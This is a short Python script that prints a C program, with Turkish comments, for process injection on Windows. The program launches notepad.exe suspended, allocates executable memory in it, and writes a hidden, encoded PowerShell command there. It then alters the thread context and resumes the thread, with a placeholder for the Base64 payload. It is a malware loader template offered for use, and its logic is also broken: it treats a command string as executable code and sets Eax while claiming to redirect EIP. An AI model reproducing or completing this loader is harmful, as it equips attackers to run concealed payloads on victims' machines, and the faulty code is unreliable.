x = """
#include <windows.h>
#include <stdio.h>

int main() {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    // Suspended şekilde notepad.exe başlatılır
    if (!CreateProcessW(NULL, L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("CreateProcess failed (%lu).\n", GetLastError());
        return 1;
    }

    // PowerShell Base64 payload'unu buraya koy
    const char* payload = "<BASE64_POWERSHELL_PAYLOAD>";

    // WinExec çağıran küçük bir shellcode/loader oluştur (örnek)
    char command[512];
    snprintf(command, sizeof(command), "powershell -nop -w hidden -enc %s", payload);

    // Bellek ayır
    LPVOID remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, strlen(command) + 1,
                                         MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteBuffer) {
        printf("VirtualAllocEx failed (%lu).\n", GetLastError());
        return 1;
    }

    // Komutu hedef prosese yaz
    if (!WriteProcessMemory(pi.hProcess, remoteBuffer, command, strlen(command) + 1, NULL)) {
        printf("WriteProcessMemory failed (%lu).\n", GetLastError());
        return 1;
    }

    // Thread context alınır (x86)
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        printf("GetThreadContext failed (%lu).\n", GetLastError());
        return 1;
    }

    // EIP'i bizim komutumuza yönlendir
    ctx.Eax = (DWORD)(SIZE_T)remoteBuffer;
    if (!SetThreadContext(pi.hThread, &ctx)) {
        printf("SetThreadContext failed (%lu).\n", GetLastError());
        return 1;
    }

    // Thread'i devam ettir
    ResumeThread(pi.hThread);

    return 0;
}




"""
print(x)